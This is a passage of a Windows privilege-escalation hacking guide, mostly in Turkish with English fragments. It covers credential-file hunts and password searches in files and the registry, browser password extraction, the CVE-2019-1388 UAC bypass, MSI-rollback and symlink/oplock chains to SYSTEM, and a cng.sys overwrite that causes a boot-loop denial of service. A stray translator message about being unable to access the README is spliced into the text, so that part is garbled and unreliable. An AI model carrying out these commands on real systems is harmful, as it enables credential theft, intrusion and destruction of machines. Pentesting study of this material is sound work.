```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
İçeriğe şu anda erişemiyorum. Lütfen çevirmemi istediğiniz src/windows-hardening/windows-local-privilege-escalation/README.md dosyasının içeriğini yapıştırın veya gönderin.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin'deki Credentials

İçindeki credentials için Bin'i de kontrol etmelisin

Birçok program tarafından kaydedilen **passwords**'u kurtarmak için şunu kullanabilirsin: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry içinde

**credentials içeren diğer olası registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

passwords'ın **Chrome veya Firefox**'tan saklandığı db'leri kontrol etmelisin.\ Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini kontrol et; belki bazı **passwords are** orada saklıdır.

Tarayıcılardan passwords çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM), farklı dillerde yazılmış yazılım bileşenleri arasında iletişim sağlayan Windows işletim sistemi içinde yerleşik bir teknolojidir. Her COM bileşeni class ID (CLSID) ile tanımlanır ve her bileşen bir veya daha fazla interface aracılığıyla işlevsellik sunar; bu interface'ler interface ID (IIDs) ile tanımlanır.

COM sınıfları ve interface'ler registry'de sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes**'ın birleştirilmesiyle oluşturulur = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Temelde, yürütülecek herhangi bir DLL'i **overwrite any of the DLLs** değiştirebiliyorsan ve o DLL farklı bir kullanıcı tarafından çalıştırılacaksa, **escalate privileges** elde edebilirsin.

Saldırganların COM Hijacking'i persistence mekanizması olarak nasıl kullandığını öğrenmek için bak:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Genel Password araması dosyalarda ve registry'de**

**Dosya içeriklerini ara**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adına sahip bir dosyayı ara**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt defterinde anahtar adlarını ve şifreleri ara**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf için bir** eklentidir. Bu eklentiyi, hedefte credentials arayan tüm metasploit POST modüllerini otomatik olarak çalıştırmak için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen ve parolalar içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için başka bir harika araçtır.

Araç [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher), veriyi açık metin olarak saklayan (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP) çeşitli araçların **sessions**, **usernames** ve **passwords**'larını arar.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Daha fazla bilgi ve bu zafiyeti **nasıl tespit edip istismar edeceğinize** dair örneği okuyun.](leaked-handle-exploitation.md)\
[Daha eksiksiz bir açıklama ve farklı izin seviyeleriyle (sadece tam erişim değil) süreç ve thread open handler'larını test edip kötüye kullanma yöntemleri için bu **diğer yazıyı** okuyun.](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. Böyle bir saldırıyı nasıl gerçekleştireceğinize dair kılavuzlar için bakınız [**here**](named-pipe-client-impersonation.md) ve [**here**](#from-high-integrity-to-system).

Ayrıca aşağıdaki araç, burp gibi bir araçla named pipe iletişimini **intercept** etmeye izin verir: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) ve bu araç tüm pipe'ları listeleyip privescs bulmaya yardımcı olur: [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Sayfaya göz atın: **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. Bakınız:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Bir kullanıcı olarak shell elde ettiğinizde, scheduled tasks veya diğer süreçler komut satırında **kimlik bilgileri geçirebilir**. Aşağıdaki script her iki saniyede bir process command lines'ı yakalar ve mevcut durumu önceki durumla karşılaştırarak herhangi bir farkı çıktı olarak verir.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## İşlemlerden parolaları çalma

## Düşük Yetkili Kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafiksel arayüze (console veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, bazı Microsoft Windows sürümlerinde ayrıcalıksız bir kullanıcı olarak "NT\AUTHORITY SYSTEM" gibi bir terminal veya başka bir süreç çalıştırmak mümkündür.

Bu, aynı güvenlik açığı ile aynı anda ayrıcalık yükseltmeyi ve UAC atlamayı mümkün kılar. Ayrıca, herhangi bir şey yüklemeye gerek yoktur ve süreç sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu vulnerability'yi exploit etmek için aşağıdaki adımları uygulamanız gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Integrity Levels hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Sonra UAC ve UAC bypass'ları hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Teknik, bu blog yazısında (https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) tarif edildi ve exploit kodu burada bulunuyor (https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Saldırı temelde Windows Installer'ın rollback özelliğini kötüye kullanarak, uninstall sırasında meşru dosyaların yerine kötü amaçlı olanların konmasını sağlamakla ilgilidir. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek amacıyla kullanılacak bir **malicious MSI installer** oluşturması gerekir; Windows Installer daha sonra uninstall sırasında rollback dosyalarını burada saklayacaktır ve bu rollback dosyaları kötü amaçlı payload içerecek şekilde değiştirilir.

Özet teknik şu şekildedir:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> Bu noktada, `C:\Config.Msi` klasörünü silmek için **SYSTEM-level arbitrary folder delete vulnerability**'yi tetikleyin.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- Boom: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Ana MSI rollback tekniği (önceki), bir **klasörün tamamını** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya zafiyetiniz yalnızca **arbitrary file deletion** izni veriyorsa?

NTFS iç yapılarını kullanarak sömürebilirsiniz: her klasörün gizli bir alternate data stream'i vardır, adı:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu akış klasörün **indeks meta verisini** saklar.

Yani, bir klasörün **`::$INDEX_ALLOCATION` akışını silerseniz**, NTFS dosya sisteminden **tüm klasörü kaldırır**.

Bunu şu gibi standart dosya silme API'leri kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API'yi çağırıyor olsanız bile, o **klasörün kendisini siliyor**.

### Folder Contents Delete'den SYSTEM EoP'ye
Peki primitive'iniz rastgele dosya/klasörleri silmenize izin vermiyorsa ama **saldırgan kontrolündeki bir klasörün *içeriğinin* silinmesine izin veriyorsa** ne olur?

1. Step 1: Tuzak bir klasör ve dosya oluşturun
- Oluştur: `C:\temp\folder1`
- İçinde: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` üzerine bir **oplock** yerleştirin
- Oplock, yetkili bir süreç `file1.txt`'i silmeye çalıştığında **yürütmeyi duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM sürecini tetikle (ör., `SilentCleanup`)
- Bu süreç klasörleri tarar (ör., `%TEMP%`) ve içeriklerini silmeye çalışır.
- `file1.txt`'e ulaştığında, **oplock tetiklenir** ve kontrolü callback'inize verir.

4. Adım 4: oplock callback içinde – silmeyi yönlendir

- Seçenek A: `file1.txt`'i başka bir yere taşı
- Bu, oplock'u bozmadan `folder1`'i boşaltır.
- `file1.txt`'i doğrudan silmeyin — bu oplock'u erken serbest bırakır.

- Seçenek B: `folder1`'i bir **junction**'a dönüştür:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini depolayan NTFS internal stream'ini hedefler — onu silmek klasörü siler.

5. Adım 5: oplock'u serbest bırak
- SYSTEM işlemi devam eder ve `file1.txt`'i silmeye çalışır.
- Ama şimdi, junction + symlink nedeniyle, aslında şunu siliyor:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi` SYSTEM tarafından silinir.

### Arbitrary Folder Create'dan Kalıcı DoS'a

Size **SYSTEM/admin olarak rastgele bir klasör oluşturma** izni veren bir primitive'i exploit edin — **dosya yazamıyorsanız** veya **zayıf izinler ayarlayamıyorsanız** bile.

Adı **kritik bir Windows sürücüsü** olan bir **klasör** (dosya değil) oluşturun, örn.:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` çekirdek modu sürücüsüne karşılık gelir.
- Eğer bunu **bir klasör olarak önceden oluşturursanız**, Windows gerçek sürücüyü önyüklemede yüklemeye çalışırken başarısız olur.
- Sonra, Windows önyükleme sırasında `cng.sys`'i yüklemeyi dener.
- Klasörü görür, **gerçek sürücüyü çözemeyince başarısız olur**, ve **çökme veya önyüklemenin durması** gerçekleşir.
- Dış müdahale olmadan (ör. önyükleme onarımı veya disk erişimi) **geri dönüş yok**, ve **kurtarma yok**.

### Ayrıcalıklı log/backup yollarından + OM symlinks ile rastgele dosya üzerine yazma / boot DoS

Bir **ayrıcalıklı servis** log/exports'ı bir **yazılabilir config**'ten okunan bir yola yazdığında, bu yolu **Object Manager symlinks + NTFS mount points** ile yönlendirerek ayrıcalıklı yazmayı rastgele bir overwrite'a dönüştürebilirsiniz (hatta **SeCreateSymbolicLinkPrivilege** olmadan bile).

**Gereksinimler**
- Hedef yolu saklayan config, saldırgan tarafından yazılabilir olmalı (ör. `%ProgramData%\...\.ini`).
- `\RPC Control`'e bir mount point ve bir OM dosya symlink'i oluşturabilme yeteneği (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- O yola yazan ayrıcalıklı bir işlem (log, export, report).

**Örnek zincir**
1. Konfigürasyonu okuyun ve ayrıcalıklı log hedefini bulun, ör. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` satırı `C:\ProgramData\ICONICS\IcoSetup64.ini` içinde.
2. Yolu admin olmadan yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Yetkili bileşenin log yazmasını bekleyin (ör. admin "send test SMS" tetikler). Yazma artık `C:\Windows\System32\cng.sys` konumuna gider.
4. Üzerine yazılan hedefi (hex/PE parser) inceleyerek bozulmayı doğrulayın; yeniden başlatma Windows'un değiştirilmiş sürücü yolunu yüklemesini zorlar → **boot loop DoS**. Bu, yetkili bir servisin yazma için açacağı herhangi bir korumalı dosyaya da genellenebilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys`'den yüklenir, ancak eğer bir kopyası `C:\Windows\System32\cng.sys`'te mevcutsa önce denenebilir, bu da bozuk veriler için güvenilir bir DoS hedefi yapar.



## **High Integrity'den SYSTEM'e**

### **Yeni servis**

Zaten High Integrity düzeyinde bir işlem üzerinde çalışıyorsanız, **SYSTEM'e giden yol** yeni bir servis **oluşturup çalıştırmak** kadar basit olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Bir servis ikili dosyası oluştururken bunun geçerli bir servis olduğundan veya ikili dosyanın gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir servis değilse 20 saniye içinde sonlandırılacaktır.

### AlwaysInstallElevated

Bir High Integrity process'ten AlwaysInstallElevated kayıt defteri girdilerini **etkinleştirmeyi** ve bir _**.msi**_ sarmalayıcısı kullanarak bir reverse shell **yüklemeyi** deneyebilirsiniz.\
[İlgili kayıt defteri anahtarları ve bir _.msi_ paketinin nasıl yükleneceği hakkında daha fazla bilgi için buraya bakın.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Bu kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Eğer bu token ayrıcalıklarına sahipseniz (muhtemelen zaten bir High Integrity process içinde bulacaksınız), SeDebug ayrıcalığı ile neredeyse herhangi bir process'i (korunmuş olmayan processler) açabilir, process'in token'ını **kopyalayabilir** ve o token ile **rastgele bir process oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan herhangi bir processin seçilmesini** içerir (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Bu önerilen tekniği çalıştıran kod örneğini** [**burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik meterpreter tarafından `getsystem` yükseltmesinde kullanılır. Teknik, bir pipe oluşturup ardından o pipe'a yazması için bir service oluşturmayı/kötüye kullanmayı içerir. Daha sonra, `SeImpersonate` ayrıcalığını kullanarak pipe'ı oluşturan **server**, pipe istemcisinin (service) token'ını **impersonate** ederek SYSTEM ayrıcalıkları elde edebilir.\
Eğer name pipes hakkında [**daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
Eğer name pipes kullanarak high integrity'den System'e nasıl geçileceğine dair bir örnek okumak istiyorsanız [**bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Eğer SYSTEM olarak çalışan bir process tarafından yüklenen bir dll'i **hijack** etmeyi başarırsanız, bu izinlerle rastgele kod çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için kullanışlıdır ve ayrıca high integrity process'ten elde edilmesi çok **daha kolaydır**, çünkü dll'lerin yüklendiği klasörlerde **write permissions**'a sahip olacaktır.\
**Dll hijacking hakkında daha fazla bilgiyi** [**burada öğrenebilirsiniz**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kaydedilmiş oturum bilgilerini çıkarır. Yerelde -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde dener (password spray).**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumerasyonu**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc zafiyetlerini arar (Watson için DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin hakları gerekli)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini arar (VisualStudio kullanılarak derlenmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yapılandırma hatalarını aramak için host'u enumerate eder (privesc'ten ziyade bilgi toplama aracı) (derlenmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (github'da önceden derlenmiş exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (github'da önceden derlenmiş executable). Önerilmez. Win10'da iyi çalışmıyor.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmıyor.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (doğru çalışması için accesschk'e ihtiyaç duymaz ama kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit önerir (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

